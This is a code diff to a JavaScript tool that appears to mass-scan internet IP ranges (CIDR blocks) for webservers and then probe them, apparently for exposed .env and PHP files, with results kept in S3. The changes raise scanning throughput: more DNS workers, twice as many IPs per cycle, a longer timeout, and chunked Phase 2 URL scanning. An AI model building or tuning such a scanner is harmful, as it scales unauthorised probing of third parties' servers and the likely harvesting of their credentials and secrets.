@@ -41,17 +41,18 @@ var BUNNY_API_KEY = "";
 var LOAD_FROM_SITE = false;
 var LOAD_FROM_CIDR = true;
 var USE_REV = false;
-var MAX_SITE_BATCH = 3;
+var MAX_SITE_BATCH = 2;
 var MAX_LIST_ENV = 20;
 var MAX_LIST_PHP = 20;
-var DNS_WORKERS_EC2 = 100;
+var DNS_WORKERS_EC2 = 200;
 var DNS_TIMEOUT_EC2 = 4;
-var TOTAL_IPS_PER_CYCLE = 4e3;
+var TOTAL_IPS_PER_CYCLE = 8e3;
 var NUM_CIDR_PER_CYCLE = 6;
 var TOTAL_SLOTS = 2e3;
-var NUM_WORKERS = 4;
+var NUM_WORKERS = 5;
 var POOL_REFRESH_CYCLES = 10;
-var SCAN_TIMEOUT_MS = 8e3;
+var SCAN_TIMEOUT_MS = 6e4;
+var MAX_URLS_PER_WORKER = 10;
 var s3Client = new S3Client({
   region: S3_REGION,
   credentials: { accessKeyId: S3_ACCESS_KEY, secretAccessKey: S3_SECRET_KEY },
@@ -925,13 +926,20 @@ async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum) {
     [urls[i], urls[j]] = [urls[j], urls[i]];
   }
   log(`[W${workerId} GATHER #${cycleNum}] Phase 1: ${hits} webservers, ${processed - hits} discarded out of ${totalMy} IPs`);
-  if (urls.length > 0) {
-    log(`[W${workerId}] Phase 2 \u2014 Scanning ${urls.length} verified URLs...`);
-    await processUrlsWithTimeout(urls).catch((e) => log(`[W${workerId}] Phase 2 \u2014 Timeout/error: ${e.message}`));
-    log(`[W${workerId}] Phase 2 completed.`);
-  } else {
+  if (urls.length === 0) {
     log(`[W${workerId}] No URLs found. Skipping scan.`);
+    return;
   }
+  let chunkNum = 0;
+  for (let offset = 0; offset < urls.length; offset += MAX_URLS_PER_WORKER) {
+    chunkNum++;
+    const chunk = urls.slice(offset, offset + MAX_URLS_PER_WORKER);
+    const totalChunks = Math.ceil(urls.length / MAX_URLS_PER_WORKER);
+    log(`[W${workerId}] Phase 2 \u2014 Chunk ${chunkNum}/${totalChunks} \u2014 Scanning ${chunk.length} verified URLs...`);
+    await processUrlsWithTimeout(chunk).catch((e) => log(`[W${workerId}] Phase 2 chunk ${chunkNum} \u2014 Timeout/error: ${e.message}`));
+    log(`[W${workerId}] Phase 2 chunk ${chunkNum}/${totalChunks} completed.`);
+  }
+  log(`[W${workerId}] Phase 2 \u2014 ALL chunks completed (${urls.length} URLs total).`);
 }
 var cidrPoolShared = null;
 var scannedUrlsGlobal = /* @__PURE__ */ new Set();
